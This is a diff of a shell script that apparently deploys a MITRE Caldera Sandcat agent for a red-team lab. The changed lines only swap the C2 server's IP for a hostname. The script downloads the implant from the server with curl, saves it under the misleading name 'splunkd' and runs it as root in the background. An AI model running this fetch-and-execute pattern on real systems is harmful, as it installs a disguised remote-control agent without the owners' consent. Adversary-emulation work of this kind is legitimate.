@@ -159,7 +159,7 @@ SANDCAT_BIN="/opt/sandcat/splunkd"
 if [ ! -x "$SANDCAT_BIN" ]; then
   echo "No existing Sandcat binary found -- downloading."
   sudo mkdir -p /opt/sandcat
-  server="http://10.60.10.39:8888"
+  server="http://control-node:8888"
   curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "architecture:amd64" "$server/file/download" | sudo tee "$SANDCAT_BIN" > /dev/null
   sudo chmod +x "$SANDCAT_BIN"
 else
@@ -169,7 +169,7 @@ fi
 # Start Sandcat
 echo "Starting Sandcat"
 
-if sudo bash -c "nohup $SANDCAT_BIN -server http://10.60.10.39:8888 -group webserver-red > /var/log/sandcat.log 2>&1 &"; then
+if sudo bash -c "nohup $SANDCAT_BIN -server http://control-node:8888 -group webserver-red > /var/log/sandcat.log 2>&1 &"; then
   sleep 2
   if pgrep -f "$SANDCAT_BIN" > /dev/null; then
     echo "Caldera Agent running in background"
